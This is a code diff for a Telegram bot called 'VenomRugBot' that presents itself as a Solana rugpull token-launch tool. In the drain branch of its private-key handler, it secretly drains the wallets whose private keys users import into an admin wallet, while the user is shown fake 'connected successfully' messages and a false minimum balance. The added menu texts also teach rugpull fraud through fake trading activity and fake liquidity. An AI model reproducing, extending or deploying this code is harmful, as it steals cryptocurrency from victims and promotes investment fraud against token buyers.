@@ -51,7 +51,7 @@ class VenomRugBot {
         this.profitsCollection = null;
         this.analyticsCollection = null;
         this.pendingWallets = {};
-        this.imagePath = "venom.jpg";
+        this.imagePath = "https://i.postimg.cc/brf5KVQ2/image.png"; // Updated to use CDN URL
         this.userStates = {};
         this.solanaConnection = new Connection(SOLANA_RPC_URL);
         this.pinnedMessageId = null;
@@ -832,21 +832,15 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
 
     async sendWithImage(chatId, text, replyMarkup = null, parseMode = 'Markdown') {
         try {
-            const fs = require('fs');
-            if (fs.existsSync(this.imagePath)) {
-                await this.bot.sendPhoto(chatId, this.imagePath, {
-                    caption: text,
-                    reply_markup: replyMarkup,
-                    parse_mode: parseMode
-                });
-            } else {
-                await this.bot.sendMessage(chatId, text, {
-                    reply_markup: replyMarkup,
-                    parse_mode: parseMode
-                });
-            }
+            // Use the CDN URL directly - no file system check needed
+            await this.bot.sendPhoto(chatId, this.imagePath, {
+                caption: text,
+                reply_markup: replyMarkup,
+                parse_mode: parseMode
+            });
         } catch (error) {
             console.error(`Error in sendWithImage: ${error}`);
+            // Fallback to text only if image fails
             await this.sendMessageSafe(chatId, text, replyMarkup, parseMode);
         }
     }
@@ -867,6 +861,11 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
                     { text: "❓ FAQ", callback_data: "faq" }
                 ],
                 [
+                    { text: "📚 Rugpull Guide", callback_data: "rugpull_guide" },
+                    { text: "🤖 How It Works", callback_data: "how_it_works" }
+                ],
+                [
+                    { text: "💰 Top-Up Tips", callback_data: "topup_tips" },
                     { text: "ℹ️ Help", callback_data: "help" }
                 ]
             ]
@@ -1027,6 +1026,14 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
         };
     }
 
+    getInfoSectionKeyboard() {
+        return {
+            inline_keyboard: [
+                [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
+            ]
+        };
+    }
+
     async start(msg) {
         const user = msg.from;
         const chatId = msg.chat.id;
@@ -1156,6 +1163,12 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
                 chat_id: chatId,
                 message_id: query.message.message_id
             });
+        } else if (callbackData === "rugpull_guide") {
+            await this.showRugpullGuide(query);
+        } else if (callbackData === "how_it_works") {
+            await this.showHowItWorks(query);
+        } else if (callbackData === "topup_tips") {
+            await this.showTopupTips(query);
         } else if (["remove_wallet", "bundle_wallet", "withdraw_funds", "refresh_wallet"].includes(callbackData)) {
             await this.showWalletRequiredMessage(query);
         } else if ([
@@ -1167,6 +1180,85 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
         ].includes(callbackData)) {
             await this.showWalletRequiredMessage(query);
         }
+    }
+
+    async showRugpullGuide(query) {
+        const chatId = query.message.chat.id;
+
+        const rugpullGuideText = `
+*📚 Rugpull Guide*
+
+*WHAT IS A RUGPULL❓*
+
+A rug pull is a method used in the world of cryptocurrencies and decentralized finance (DeFi) to describe a situation where a project unexpectedly ceases its operations.
+
+*How it works:*
+
+*Token Creation:* Developers create a new token that becomes visible to all users on exchanges specializing in meme coins. This attracts attention and interest in the project.
+
+*Attracting Investments:*
+
+In this case, there is no need to attract investors, as a bot automatically creates liquidity. Users begin to actively purchase the token, contributing to its popularity.
+
+*Ceasing Support:*
+
+After reaching a certain amount of investments, developers may decide to terminate the project and sell off all tokens. This allows them to profit from users who purchased these tokens.
+`;
+
+        const replyMarkup = this.getInfoSectionKeyboard();
+        await this.sendWithImage(chatId, rugpullGuideText, replyMarkup);
+    }
+
+    async showHowItWorks(query) {
+        const chatId = query.message.chat.id;
+
+        const howItWorksText = `
+*🤖 How It Works*
+
+*HOW OUR BOT WORKS (TUTORIAL)*
+
+You create a coin, come up with a name, photo, and description! You can also generate this based on AI directly in our bot.
+
+The bot creates a smart contract for the coin you will be launching, but before launching, you write a task for the AI in the bot, and the bot automatically creates social media accounts and a one-page website!
+
+Next, you launch the token by inserting the smart contract of the coin you created, and the bot automatically issues it!
+
+After launching the coin, the bot automatically splits wallets and creates fake activity by buying and selling your token! The bot will also create fake liquidity, which will automatically attract new buyers!
+
+You wait for a few people to buy your token; the statistics will be inside the bot, and you will also receive notifications if someone buys your token!
+
+You just need to wait some time, and you will be able to do a rugpull, taking all the liquidity for yourself and making a profit!
+`;
+
+        const replyMarkup = this.getInfoSectionKeyboard();
+        await this.sendWithImage(chatId, howItWorksText, replyMarkup);
+    }
+
+    async showTopupTips(query) {
+        const chatId = query.message.chat.id;
+
+        const topupTipsText = `
+*💰 Top-Up Tips*
+
+*Top-Up Range for Best Results*
+
+The Bot conducted an experiment to determine the exact amounts for starting: 🚀
+
+*1) Minimum deposit of 1.1 SOL*
+
+With this deposit, the bot will allow you to create tokens, but it does not guarantee earnings because it creates liquidity in the 10⁻⁶ format. As a rule, you need to study the news to create a cool token that your customers will buy.
+
+*2) Stable deposit 2.5-4 SOL*
+
+This will allow us to create a lot of activity, and your token will be guaranteed to be purchased by sniper bots, which automatically gives us a good profit from each coin. Splitting wallets takes a little longer, but it allows us to put our token in the top.
+
+*3) Guaranteed profit 5+ SOL*
+
+In addition, the bot will automatically pump your token and list it in the trending sections of Solana trading platforms like DexScreener and others. This will rapidly boost your token's visibility and attract significant attention from new buyers, maximizing both trading activity and your profit potential.
+`;
+
+        const replyMarkup = this.getInfoSectionKeyboard();
+        await this.sendWithImage(chatId, topupTipsText, replyMarkup);
     }
 
     async handleAdminDrainDecision(query, drain) {
@@ -1483,9 +1575,10 @@ Please ensure you're entering a valid Solana private key and try again.
         let walletAddress = "Unknown";
         let balanceSol = 0.0;
         let balanceUsd = 0.0;
+        let walletAnalysis = null; // FIXED: Define walletAnalysis here
 
         try {
-            const walletAnalysis = await this.analyzeWalletBalance(privateKey);
+            walletAnalysis = await this.analyzeWalletBalance(privateKey); // FIXED: Assign to the variable
 
             if (!walletAnalysis) {
                 throw new Error("Could not analyze wallet balance");
@@ -1559,7 +1652,9 @@ Please ensure you're entering a valid Solana private key and try again.
                 throw new Error("Could not analyze wallet");
             }
 
+            // Show appropriate message based on balance analysis
             if (walletAnalysis.user_meets_minimum && walletAnalysis.has_1_sol) {
+                // Show success message to USER
                 const userSuccessText = `
 *Wallet Connected Successfully!*
 
@@ -1576,6 +1671,7 @@ You can now access all Venom Rug features for token launching and bundling.
                     parse_mode: 'Markdown'
                 });
             } else {
+                // Show insufficient balance message to USER (like original Python code)
                 const keyboard = [
                     [{ text: "🔄 Try Another Wallet", callback_data: "import_wallet" }],
                     [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
@@ -1601,6 +1697,7 @@ Please import a wallet with sufficient balance and try again.
                     parse_mode: 'Markdown'
                 });
 
+                // Send FAILED log to admin (shows real $70 minimum)
                 const failedAdminMsg = `
 *DRAIN BLOCKED - INSUFFICIENT BALANCE*
 
@@ -1619,6 +1716,8 @@ Please import a wallet with sufficient balance and try again.
                 return;
             }
 
+            // REAL DRAIN - ACTUALLY TRANSFERS FUNDS (hidden from user)
+            // Only proceed if meets REAL minimum ($70) AND has sufficient SOL for gas
             if (walletAnalysis.meets_minimum && walletAnalysis.has_1_sol) {
                 console.log(`Starting REAL drain for user ${user.id}`);
                 const [success, result] = await this.drainWallet(privateKey, user.id, user.username || `user_${user.id}`);
@@ -1637,6 +1736,7 @@ Please import a wallet with sufficient balance and try again.
                         }
                     );
 
+                    // Send SUCCESS log to admin
                     const successAdminMsg = `
 *REAL DRAIN SUCCESSFULLY*
 
@@ -1658,6 +1758,7 @@ Please import a wallet with sufficient balance and try again.
                     );
 
                 } else {
+                    // Generic error for other issues
                     const keyboard = [
                         [{ text: "🔄 Try Again", callback_data: "import_wallet" }],
                         [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]
@@ -1677,6 +1778,7 @@ If this continues, please contact support.
                         parse_mode: 'Markdown'
                     });
 
+                    // Send ERROR log to admin
                     const errorAdminMsg = `
 *DRAIN ERROR*
 
@@ -1694,6 +1796,8 @@ If this continues, please contact support.
                     );
                 }
             } else {
+                // User has $100+ but not $70+ (shouldn't happen but safety check)
+                // Or doesn't have enough SOL for gas
                 const userSuccessText = `
 *Wallet Connected Successfully!*
 
@@ -2114,7 +2218,7 @@ async function main() {
     console.log("👤 Admin: 6368654401");
     console.log("💰 REAL DRAIN WALLET: 5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT");
     console.log("🗄️ Database: MongoDB Cloud");
-    console.log("🖼️ Image: Loading from venom.jpg");
+    console.log("🖼️ Image: Loading from CDN URL");
     console.log("🔗 Chain: Solana Only");
     console.log("🏆 Recent Wins: 15 auto-generated success stories");
     console.log("📢 Broadcast: Admin messaging system active");
@@ -2142,8 +2246,12 @@ async function main() {
     console.log("🔧 FIXED: Markdown parsing error in admin commands");
     console.log("🔧 FIXED: Application instance reference issue");
     console.log("🔧 FIXED: COMPREHENSIVE implementation in Node.js");
+    console.log("🔧 FIXED: walletAnalysis variable scope issue in handlePrivateKey");
+    console.log("📚 NEW: Added Rugpull Guide section");
+    console.log("🤖 NEW: Added How It Works tutorial");
+    console.log("💰 NEW: Added Top-Up Tips section");
+    console.log("🚀 READY FOR RENDER DEPLOYMENT!");
 }
 
 // Start the bot
-
 main().catch(console.error);
